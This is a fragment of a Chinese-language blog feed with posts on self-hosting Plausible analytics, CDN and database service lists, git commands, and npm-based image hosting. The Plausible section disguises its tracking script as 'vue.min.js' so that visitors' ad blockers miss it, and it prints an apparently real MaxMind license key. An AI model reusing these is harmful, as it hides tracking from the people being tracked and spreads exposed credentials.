<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">MAILER_EMAIL</span>=plausible@your.domain	<span class="comment"># 发信邮箱</span></span><br><span class="line"><span class="attr">SMTP_HOST_ADDR</span>=smtp.your.domain	<span class="comment"># SMTP 主机名</span></span><br><span class="line"><span class="attr">SMTP_HOST_PORT</span>=<span class="number">625</span>	<span class="comment"># SMTP 端口</span></span><br><span class="line"><span class="attr">SMTP_USER_NAME</span>=plausible@your.domain	<span class="comment"># 发信邮箱用户名</span></span><br><span class="line"><span class="attr">SMTP_USER_PWD</span>=admin1234567890	<span class="comment"># 发信邮箱密码</span></span><br><span class="line"><span class="attr">SMTP_HOST_SSL_ENABLED</span>=<span class="literal">true</span>	<span class="comment"># 是否启用 SSL？</span></span><br><span class="line"><span class="attr">SMTP_RETRIES</span>=<span class="number">2</span>	<span class="comment"># 发信重试次数</span></span><br></pre></td></tr></table></figure>

<p>重启容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose down &amp;&amp; docker compose up -d</span><br></pre></td></tr></table></figure>

<p>没问题的话可以去 Plausible 后台开启每周／每月／异常流量邮件报告，当然这个邮箱也可以在你忘记密码的时候用来重置密码</p>
<p><img src="/img/plausible/1.webp" alt="SMTP"></p>
<center>SMTP</center>

<h1 id="重写路径【建议】"><a href="#重写路径【建议】" class="headerlink" title="重写路径【建议】"></a>重写路径【建议】</h1><p>Plausible 是一个极其尊重隐私的网站统计服务，它：</p>
<ul>
<li>与广告技术和监视资本主义无关</li>
<li>不收集任何个人数据，所有统计数据仅为汇总数据</li>
<li>没有跨站点或跨设备跟踪</li>
<li>您 100% 拥有您的网站数据，不会将其发送、共享或出售给任何第三方</li>
<li>完全开源的网络分析软件，可以自行托管</li>
</ul>
<p>即使如此，它 <a href="https://plausible.io/docs/proxy/introduction">仍然</a> 被一些广告过滤器规则所屏蔽，作为网站管理员，我们可以使用反向代理脚本和 API 路由来减少被广告过滤器误杀的风险，按照官网文档，至少可以使用的是：</p>
<ul>
<li><a href="https://plausible.io/docs/proxy/guides/cloudflare">Cloudflare Workers</a></li>
<li><a href="https://plausible.io/docs/proxy/guides/akamai">Akamai</a></li>
<li><a href="https://plausible.io/docs/proxy/guides/netlify">Netlify</a></li>
<li><a href="https://plausible.io/docs/proxy/guides/vercel">Vercel</a></li>
<li><a href="https://plausible.io/docs/proxy/guides/cloudfront">CloudFront</a></li>
<li><a href="https://plausible.io/docs/proxy/guides/nginx">Nginx</a></li>
<li><a href="https://plausible.io/docs/proxy/guides/caddy">Caddy</a></li>
</ul>
<p>我的服务依赖 Cloudflare，但 Cloudflare Workers 每日请求数有限制，因此在本文中，我会使用 Cloudflare <strong>转换规则</strong> 下面的 <strong>重写 URL 规则</strong> 来完成这个过程，它实施起来非常容易。</p>
<p>在 Plausible 控制台获取到站点统计的脚本示例如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script defer</span><br><span class="line">  data-domain=<span class="string">&quot;blog.your.domain&quot;</span></span><br><span class="line">  src=<span class="string">&quot;https://plausible.your.domain/js/script.js&quot;</span></span><br><span class="line">&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<ul>
<li>plausible.your.domain 是您部署 Plausible 的域名</li>
<li>blog.your.domain 是您安装 Plausible 统计脚本的域名</li>
</ul>
<p>创建重写 URL 规则</p>
<p><img src="/img/plausible/2.webp" alt="Add Rewrite Rules"></p>
<center>Add Rewrite Rules</center>

<p>规则名称随便填，传入请求匹配自定义筛选表达式</p>
<p><img src="/img/plausible/3.webp" alt="Rewrite Script Rule.webp"></p>
<center>Rewrite Script Rule.webp</center>



<p>同理，再添加一条规则，重写 API 路由</p>
<p><img src="/img/plausible/4.webp" alt="Rewrite API Rule.webp"></p>
<center>Rewrite API Rule.webp</center>

<p>接下来，修改安装到被统计站点的脚本如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script defer</span><br><span class="line">  src=<span class="string">&quot;https://plausible.your.domain/js/vue.min.js&quot;</span></span><br><span class="line">  data-api=<span class="string">&quot;https://plausible.your.domain/stats/car/benz&quot;</span></span><br><span class="line">  data-domain=<span class="string">&quot;blog.your.domain&quot;</span></span><br><span class="line">&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果您的站点使用 Plausible 的其他 <a href="https://plausible.io/docs/script-extensions">统计脚本拓展</a> 也按照上面修改就可以。</p>
<h1 id="统计关键词【可选】"><a href="#统计关键词【可选】" class="headerlink" title="统计关键词【可选】"></a>统计关键词【可选】</h1><p>Plausible 支持集成 <a href="https://search.google.com/search-console/">Google Search Console</a>，可以获得通过搜索引擎得到的关键词统计，详细配置流程可参阅 <a href="https://plausible.io/docs/google-search-console-integration">Plausible 文档</a>，步骤如下：</p>
<ul>
<li>在 <a href="https://console.developers.google.com/">Google Cloud Console</a> 创建一个新项目</li>
<li>配置 OAuth 同意屏幕</li>
<li>创建一个 OAuth 客户端，获取 Client ID 和 CLIENT SECRET</li>
</ul>
<p><img src="/img/plausible/6.webp" alt="微信截图_20230815125015"></p>
<blockquote>
<p>已获授权的 JavaScript 来源，填被查询网站的网址，例：<a href="https://macin.top/">https://macin.top</a></p>
<p>已获授权的重定向 URI，填plausible网址&#x2F;auth&#x2F;google&#x2F;callback，例：<a href="https://stats.macin.ac.cn/auth/google/callback">https://stats.macin.ac.cn/auth/google/callback</a></p>
</blockquote>
<p>启用 <a href="https://console.developers.google.com/apis/api/searchconsole.googleapis.com">Google Search Console API</a></p>
<p><img src="/img/plausible/7.webp" alt="微信截图_20230815125223"></p>
<p>将 Client ID 和 Client Secret 添加到 Plausible 环境变量文件里</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">GOOGLE_CLIENT_ID</span>=xxxx</span><br><span class="line"><span class="attr">GOOGLE_CLIENT_SECRET</span>=yyyy</span><br></pre></td></tr></table></figure>

<p>重启容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose down &amp;&amp; docker compose up -d</span><br></pre></td></tr></table></figure>

<p>之后在 Plausible 配置下 Google 集成即可</p>
<p><img src="/img/plausible/5.webp" alt="Google Integration"></p>
<center>Google Integration</center>

<h1 id="城市精细度【可选】"><a href="#城市精细度【可选】" class="headerlink" title="城市精细度【可选】"></a>城市精细度【可选】</h1><p>Plausible 的 <a href="https://github.com/plausible/analytics/releases/tag/v1.5.1">v1.5.1</a> 版本新增一条可选配置项，完成这步可获得精细度达到省（州）到具体城市的统计效果，但会额外消耗 1GB 左右的 RAM，请酌情选择。</p>
<p>在前面部署好 Plausible 服务后，进入 geoip 文件夹，下载所需数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> geoip</span><br><span class="line">curl -O https://s3.eu-central-1.wasabisys.com/plausible-application/geonames.csv</span><br><span class="line"><span class="comment"># 将 LNpsJCCKPis6XvBP 替换为您的 GeoLite2 API Key</span></span><br><span class="line"><span class="built_in">export</span> MAXMIND_LICENSE_KEY=LNpsJCCKPis6XvBP</span><br><span class="line">curl -L <span class="string">&quot;https://download.maxmind.com/app/geoip_download?edition_id=GeoLite2-City&amp;license_key=<span class="variable">$&#123;MAXMIND_LICENSE_KEY&#125;</span>&amp;suffix=tar.gz&quot;</span> -o geolite2-city.mmdb.gz</span><br><span class="line">gunzip geolite2-city.mmdb.gz</span><br></pre></td></tr></table></figure>

<p>回到 Plausible 根目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># 编辑环境变量</span></span><br><span class="line">vim plausible-conf.env</span><br><span class="line"><span class="comment"># 添加下面两行</span></span><br><span class="line">GEONAMES_SOURCE_FILE=/etc/app/geonames.csv</span><br><span class="line">IP_GEOLOCATION_DB=/etc/app/geolite2-city.mmdb</span><br></pre></td></tr></table></figure>

<p>编辑 docker-compose.yml 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim docker-compose.yml</span><br><span class="line"><span class="comment"># 添加两行（有 + 标记的两行）</span></span><br><span class="line"> plausible:</span><br><span class="line">    image: plausible/analytics:latest</span><br><span class="line">    restart: always</span><br><span class="line">    <span class="built_in">command</span>: sh -c <span class="string">&quot;sleep 10 &amp;&amp; /entrypoint.sh db createdb &amp;&amp; /entrypoint.sh db migrate &amp;&amp; /entrypoint.sh run&quot;</span></span><br><span class="line">    ...</span><br><span class="line">    volumes:</span><br><span class="line">       - ./geoip:/geoip:ro</span><br><span class="line">+      - ./geoip/geonames.csv:/etc/app/geonames.csv:ro</span><br><span class="line">+      - ./geoip/geolite2-city.mmdb:/etc/app/geolite2-city.mmdb:ro</span><br></pre></td></tr></table></figure>

<p>重新创建容器即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose down &amp;&amp; docker compose up -d</span><br></pre></td></tr></table></figure>

<p><strong>参考信息</strong></p>
<p><a href="https://plausible.io/docs/self-hosting">Getting started | Plausible docs</a></p>
<ol>
<li>尽量使用 Gmail、Outlook 等邮箱</li>
<li>非必需，您也可以使用其他方式部署 SSL 证书</li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
        <tag>plausible</tag>
      </tags>
  </entry>
  <entry>
    <title>DBaaS数据库即服务大全</title>
    <url>/posts/fdabcf82/</url>
    <content><![CDATA[<ol>
<li><a href="https://planetscale.com/">PlanetScale: The world’s most advanced database platform — PlanetScale</a></li>
<li><a href="https://www.mongodb.com/">MongoDB: The Developer Data Platform | MongoDB</a></li>
<li><a href="https://supabase.com/">Supabase | The Open Source Firebase Alternative</a></li>
<li><a href="https://zeabur.com/">Zeabur - Deploying your service with one click</a></li>
<li><a href="https://www.datastax.com/products/datastax-astra">Astra DB | DataStax</a></li>
<li><a href="https://tidbcloud.com/signup">TiDB Cloud</a></li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
        <category>database</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CDN内容分发网络大全</title>
    <url>/posts/5f8198b4/</url>
    <content><![CDATA[<blockquote>
<p>排名不分先后，不确保使用正常，请自行调试</p>
</blockquote>
<h1 id="公益项目（国内访问异常）"><a href="#公益项目（国内访问异常）" class="headerlink" title="公益项目（国内访问异常）"></a>公益项目（国内访问异常）</h1><ol>
<li><a href="https://unpkg.com/">UNPKG</a></li>
<li><a href="https://www.jsdelivr.com/">jsDelivr - A free, fast, and reliable CDN for JS and open source</a></li>
<li><a href="https://cdnjs.com/">cdnjs - The #1 free and open source CDN built to make life easier for developers</a></li>
</ol>
<h1 id="国内免费（大厂保障）"><a href="#国内免费（大厂保障）" class="headerlink" title="国内免费（大厂保障）"></a>国内免费（大厂保障）</h1><ol>
<li><a href="https://www.webcache.cn/">Web缓存网 - 一个免费、快速、可靠的网站静态加速服务 (webcache.cn)</a></li>
<li><a href="https://cdn.baomitu.com/">360 前端静态资源库  (baomitu.com)</a>（推荐）</li>
<li><a href="http://cdn.bytedance.com/">字节跳动静态资源公共库 (bytedance.com)</a>（推荐）</li>
<li><a href="http://jscdn.upai.com/">又拍云JS库加速服务 (upai.com)</a></li>
<li><a href="https://lib.sinaapp.com/">新浪云计算CDN公共库 lib.sinaapp.com</a></li>
<li><a href="http://www.staticfile.org/">七牛云存储 Staticfile CDN - Powered by 七牛</a>（推荐）</li>
<li><a href="http://unpkg.shop.jd.com/">京东 NPM CDN 服务 (jd.com)</a></li>
<li>饿了么（未公开发布）<code>https://npm.elemecdn.com/包名@版本号/文件路径</code>（推荐）</li>
<li><a href="https://bilicdn.tk/">哔哩CDN | GamerNoTitle (bilicdn.tk)</a><code>https://cdn.bilicdn.tk/npm/包名@版本号/文件路径</code></li>
<li><a href="https://mirrors.sustech.edu.cn/help/cdnjs.html">南方科技大学 CDNJS Mirrors | SUSTech Open Source Mirrors</a></li>
<li><a href="https://www.bootcdn.cn/">极兔云 联合 Bootstrap 中文网开源项目免费 CDN 加速服务</a></li>
</ol>
<h1 id="国内付费"><a href="#国内付费" class="headerlink" title="国内付费"></a>国内付费</h1><ol>
<li><a href="https://cloud.tencent.com/product/cdn">CDN 内容分发网络 _CDN内容加速_CDN加速-腾讯云 (tencent.com)</a></li>
<li><a href="https://www.aliyun.com/product/cdn/">CDN_内容分发网络_CDN网站加速-阿里云 (aliyun.com)</a></li>
<li><a href="https://www.qiniu.com/products/qcdn?src=www.e4w.cn">CDN_内容分发网络_CDN 网站加速_CDN 服务器_国内 CDN 加速 - 七牛云 (qiniu.com)</a></li>
</ol>
<h1 id="国外付费"><a href="#国外付费" class="headerlink" title="国外付费"></a>国外付费</h1><ol>
<li><a href="https://www.fastly.com/">The edge cloud platform behind the best of the web | Fastly</a></li>
<li><a href="https://www.stackpath.com/">StackPath | Edge Compute | Edge Delivery | Edge Security</a></li>
<li><a href="https://cloud.google.com/cdn/">Cloud CDN: content delivery network  | Google Cloud</a></li>
<li><a href="https://www.akamai.com/zh">云计算, 安全性, 内容交付 (CDN) (akamai.com)</a></li>
<li><a href="https://azure.microsoft.com/en-us/products/cdn/">Azure Content Delivery Network | Microsoft Azure</a></li>
<li><a href="https://edg.io/">Deliver Your Business on the Leading Edge with Edgio</a></li>
<li><a href="https://www.keycdn.com/">KeyCDN - Content delivery made easy</a></li>
<li><a href="https://www.cdn77.com/">Content Delivery Network (CDN) | CDN77.com</a></li>
<li><a href="https://bunny.net/">bunny.net - The Content Delivery platform that truly Hops!</a></li>
</ol>
<h1 id="国外免费"><a href="#国外免费" class="headerlink" title="国外免费"></a>国外免费</h1><ol>
<li><a href="https://www.cloudflare.com/zh-cn/">Cloudflare 中国官网 | 智能化云服务平台 | 免费CDN安全防护 | Cloudflare</a></li>
<li><a href="https://aws.amazon.com/cn/cloudfront/">Amazon CloudFront 内容分发网络(CDN)_免费CDN加速-AWS云服务</a></li>
<li><a href="https://statically.io/">The CDN for Static Files on GitHub, GitLab, and Bitbucket - Statically</a></li>
<li><a href="https://auth.gcore.com/login/signin?next=https://cdn.gcore.com">Gcore</a></li>
</ol>
<h1 id="个人运营（随时停服）"><a href="#个人运营（随时停服）" class="headerlink" title="个人运营（随时停服）"></a>个人运营（随时停服）</h1><ol>
<li><a href="https://jsd.cdn.zzko.cn/">jsdelivr 镜像站 | jsdelivr 镜像站 (zzko.cn)</a>（推荐）</li>
<li><a href="https://cdn.cmds.run/">cdn.cmds.run</a>（推荐）</li>
<li><a href="https://cdn.onmicrosoft.cn/">渺软公益 CDN - 国内线路加速 jsDelivr UNPKG cdnjs 开发者自用CDN (onmicrosoft.cn)</a>（推荐）</li>
<li><a href="https://u.sb/css-cdn/">https://u.sb/css-cdn/</a></li>
<li><a href="https://www.sourcegcdn.com/">https://www.sourcegcdn.com</a></li>
<li><a href="https://bilicdn.tk/">https://bilicdn.tk</a></li>
<li><a href="https://blog.1id.top/post/zi-zhi-de-yi-ge-jsdelivr-jing-xiang-fen-xiang">https://blog.1id.top/post/zi-zhi-de-yi-ge-jsdelivr-jing-xiang-fen-xiang</a></li>
<li><a href="https://www.xxhzm.cn/archives/733/">https://www.xxhzm.cn/archives/733/</a></li>
<li><a href="https://cdn.haorwen.tk/">https://cdn.haorwen.tk</a></li>
<li><a href="https://jsew.cky.codes/">https://jsew.cky.codes</a></li>
<li><a href="https://a-js.cc/archives/128.html">https://a-js.cc/archives/128.html</a></li>
<li><a href="https://github.com/54ayao/Chinajsdelivr">https://github.com/54ayao/Chinajsdelivr</a></li>
<li><a href="https://jsd.cdn.zzko.cn/">https://jsd.cdn.zzko.cn/</a></li>
<li><a href="https://cdn.akass.cn/">https://cdn.akass.cn</a></li>
<li><a href="https://cdn2.chuqis.com/">https://cdn2.chuqis.com</a></li>
</ol>
<p>如有更好用的CDN欢迎评论补充</p>
]]></content>
      <categories>
        <category>web</category>
        <category>cdn</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>git常用命令和版本回滚方法</title>
    <url>/posts/423abe9e/</url>
    <content><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="1、第一次初始化"><a href="#1、第一次初始化" class="headerlink" title="1、第一次初始化"></a>1、第一次初始化</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span></span><br><span class="line">git remote add origin git@github.com:帐号名/仓库名.git</span><br><span class="line">git pull origin main</span><br><span class="line"><span class="comment">#加-f强推</span></span><br><span class="line">git push origin main -f </span><br></pre></td></tr></table></figure>

<p>复制仓库源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh模式</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:用户名/仓库名.git</span><br><span class="line"><span class="comment"># https模式</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/用户名/仓库名.git</span><br></pre></td></tr></table></figure>

<h2 id="2、初始化仓库"><a href="#2、初始化仓库" class="headerlink" title="2、初始化仓库"></a>2、初始化仓库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<h2 id="3、加到缓存区"><a href="#3、加到缓存区" class="headerlink" title="3、加到缓存区"></a>3、加到缓存区</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加所有项目至缓存区</span></span><br><span class="line">git add .  </span><br><span class="line"><span class="comment">#添加指定目录到缓存区</span></span><br><span class="line">git add 目录名</span><br><span class="line"><span class="comment">#添加指定文件到缓存区</span></span><br><span class="line">git add 文件名</span><br></pre></td></tr></table></figure>

<h2 id="4、提交至本地仓库"><a href="#4、提交至本地仓库" class="headerlink" title="4、提交至本地仓库"></a>4、提交至本地仓库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;update&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="5、推送本地仓库信息至远程仓库"><a href="#5、推送本地仓库信息至远程仓库" class="headerlink" title="5、推送本地仓库信息至远程仓库"></a>5、推送本地仓库信息至远程仓库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将本地分支的更新内容，全部推送至远程仓库 main 分支</span></span><br><span class="line">git push origin main</span><br><span class="line"><span class="comment">#将本地 dev 分支推送到远程，再由一个人统一加到 main 分支上</span></span><br><span class="line">git push origin dev</span><br></pre></td></tr></table></figure>

<h2 id="6、拉取远程仓库最新文件"><a href="#6、拉取远程仓库最新文件" class="headerlink" title="6、拉取远程仓库最新文件"></a>6、拉取远程仓库最新文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#拉取远程仓库所有分支合并到本地</span></span><br><span class="line">git pull</span><br><span class="line"><span class="comment">#拉取远程main分支，合并到当前本地main分支</span></span><br><span class="line">git pull origin main</span><br><span class="line"><span class="comment">#仅做拉取操作，不做合并，合并需要自己再找其他方法</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">#注意：一般都用 git pull</span></span><br></pre></td></tr></table></figure>

<h2 id="Git-命令个别专用名词译名"><a href="#Git-命令个别专用名词译名" class="headerlink" title="Git 命令个别专用名词译名"></a>Git 命令个别专用名词译名</h2><ul>
<li>Workspace：工作区</li>
<li>Index &#x2F; Stage：暂存区</li>
<li>Repository：仓库区（或本地仓库）</li>
<li>Remote：远程仓库</li>
</ul>
<h1 id="代码回滚"><a href="#代码回滚" class="headerlink" title="代码回滚"></a>代码回滚</h1><p>我们从本地向Github或Gitlab、Gitee等远程仓库push代码时，有时候会因为一些细节或者在push之前，没有pull拉取远程仓库中最新的内容，导致push远程仓库之后，项目生产环境异常，或者无法正常部署！！！</p>
<p>针对上述情况，我们应该知道如何使项目回滚到push之前的版本，重新来过！！！</p>
<h2 id="1、查看commit-hash值"><a href="#1、查看commit-hash值" class="headerlink" title="1、查看commit hash值"></a>1、查看commit hash值</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br><span class="line">或者</span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure>

<p>项目到达最新的版本时，异常报错了，所以要回到上一个版本。</p>
<h2 id="2、执行git-reset-–hard-xxxx回滚命令"><a href="#2、执行git-reset-–hard-xxxx回滚命令" class="headerlink" title="2、执行git reset –hard xxxx回滚命令"></a>2、执行git reset –hard xxxx回滚命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#回滚到上一个版本</span></span><br><span class="line">git reset --hard 4ad24e8</span><br></pre></td></tr></table></figure>


<p>其中xxxx就是每一个版本前面的commit hash值。</p>
<p>此时，本地的仓库已经成功回滚到上一个版本。</p>
<h2 id="3、执行远程回滚命令git-push-f"><a href="#3、执行远程回滚命令git-push-f" class="headerlink" title="3、执行远程回滚命令git push -f"></a>3、执行远程回滚命令git push -f</h2><p>注意：第二步只是回滚了本地的代码，也就是自己的workspace的代码。GitHub上的仓库中的代码还没有回滚。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#强制提交到github远程仓库</span></span><br><span class="line">git push -f</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#再次查看历史版本</span></span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure>


<p>查看github仓库历史版本：</p>
<p>到这就完成了！！！</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>github图仓actions同步到npm，用unpkg和jsDelivr等cdn加速图片</title>
    <url>/posts/4e336b5/</url>
    <content><![CDATA[<ol>
<li><p>首先需要注册一个npm的账号。访问<a href="https://www.npmjs.com/signup/">npm注册页面</a><br><img src="/img/npm/1.webp" alt="a935a0d4"></p>
</li>
<li><p>完成邮箱验证，注册完成后进入账号管理界面:头像-&gt;Account，拉倒最上方，你会看到<code>You have not verified your email address</code>字样的提示，点击以后按提示步骤验证你的邮箱。<br><img src="/img/npm/2.webp" alt="img"></p>
</li>
<li><p>在github新建一个图床仓库，在本地合适的位置把它<code>clone</code>下来。找个空文件夹打开终端输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:[username]/[自建图仓].git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[username]/[自建图仓].git</span><br></pre></td></tr></table></figure>
</li>
<li><p>在clone下来的[自建图仓]文件夹内打开终端，输入以下指令切换回原生源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加本地npm用户设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅第一次使用需要添加用户，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm adduser</span><br><span class="line"><span class="comment"># 非第一次使用直接登录即可，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm login</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行npm初始化指令，把整个图床仓库打包，按照指示进行配置，注意需要事先确认你的包名没有和别人已发布的包重复，可以在npm官网搜索相应包名，搜不到就说明还没被占用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>

<p><img src="/img/npm/6.webp" alt="img"></p>
<p>最后会输出一段<code>package.json</code>，请求确认，输入<code>yes</code>即可。</p>
</li>
<li><p>然后输入发布指令，我们就可以把包发布到npm上了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>
</li>
<li><p>jsdelivr+npm的图片引用和jsdelivr+github很相似，例如我在[自建图仓]仓库里存放的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tu.webp</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># jsDelivr+github链接（国内无法访问）</span></span><br><span class="line">https://cdn.jsdelivr.net/gh/[Github用户名]/[自建图仓]/tu.webp</span><br><span class="line"><span class="comment"># jsDelivr+npm链接（国内无法访问）</span></span><br><span class="line">https://npm.elemecdn.com/[npm包名]/tu.webp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以看到Npm只需要提供包名即可。这也是一开始要求包名不重复的原因之一</p>
<p>jsDelivr+Npm依然有100MB的包大小限制，但是NPM有丰富的国内节点。可以挑选一个使用。个人推荐知乎的。没有大小限制，而且也很稳定。</p>
</blockquote>
<p>当然你也可以利用<a href="https://unpkg.com/">unpkg</a>自建。(UNPKG是一个内容源自npm的全球快速CDN。它部署在cloudflare上，在大陆地区访问到的是香港节点。所以速度也不错。)</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://unpkg.com/:package@:version/:file</span><br><span class="line"># 也就是（国内可访问）</span><br><span class="line">https://unpkg.com/[npm包名]/tu.webp</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果每次都要在本地进行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>

<p>的话，npm的提交是整个包一起上传的，不存在增量更新，耗时不说，而且还往往需要架梯子才能正常上传。所以我们可以把它交给github action来完成。</p>
<ul>
<li><p>在<a href="https://www.npmjs.com/">npm官网</a>-&gt;头像-&gt;Access Tokens-&gt;Generate New Token,勾选Automation选项，<code>Token</code>只会显示这一次，之后如果忘记了就只能重新生成重新配置了。<br><img src="/img/npm/3.webp" alt="img"><br><img src="/img/npm/4.webp" alt="img"></p>
</li>
<li><p>在github的[自建图仓]仓库设置项里添加一个名为<code>NPM_TOKEN</code>的<code>secrets</code>，把获取的Npm的Access token输入进去。<br><img src="/img/npm/5.webp" alt="img"></p>
</li>
<li><p>在本地的[自建图仓]文件夹下新建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[自建图仓]/.github/workflows/autopublish.yml</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Node.js</span> <span class="string">Package</span></span><br><span class="line"><span class="comment"># 监测图床分支，2020年10月后github新建仓库默认分支改为main，记得更改</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-npm:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line">          <span class="attr">registry-url:</span> <span class="string">https://registry.npmjs.org/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">publish</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NODE_AUTH_TOKEN:</span> <span class="string">$&#123;&#123;secrets.npm_token&#125;&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在本地的[自建图仓]文件夹下打开终端，运行以下指令，上传新增内容至github，即可触发部署。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将更改提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;npm publish&quot;</span></span><br><span class="line"><span class="comment"># 更新package版本号</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="comment"># 推送至github触发action</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>此处的四行指令顺序严格。<br>每次更新npm图床都需要先修改<code>[自建图仓]\package.json</code>里的<code>version</code>,也就是版本号。<br>而<code>npm version patch</code>即为更新package.json里的版本号的指令，效果是末尾版本号+1，例如<code>0.0.1=&gt;0.0.2</code>、<code>1.1.3=&gt;1.1.4</code>。免去了打开<code>package.json</code>再修改版本号的麻烦。（大版本更新还是需要手动改的）<br>更新npm图床务必要记得更新<code>package.json</code>里的版本号！</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>cdn</category>
        <category>git</category>
        <category>npm</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>cdn</tag>
        <tag>git</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>git强制拉取远程仓库覆盖本地仓库，推送本地仓库覆盖远程仓库</title>
    <url>/posts/ff015562/</url>
    <content><![CDATA[<h1 id="git拉取远程仓库强制覆盖本地仓库"><a href="#git拉取远程仓库强制覆盖本地仓库" class="headerlink" title="git拉取远程仓库强制覆盖本地仓库"></a>git拉取远程仓库强制覆盖本地仓库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch --all &amp;&amp; git reset --hard origin/main &amp;&amp; git pull</span><br></pre></td></tr></table></figure>

<blockquote>
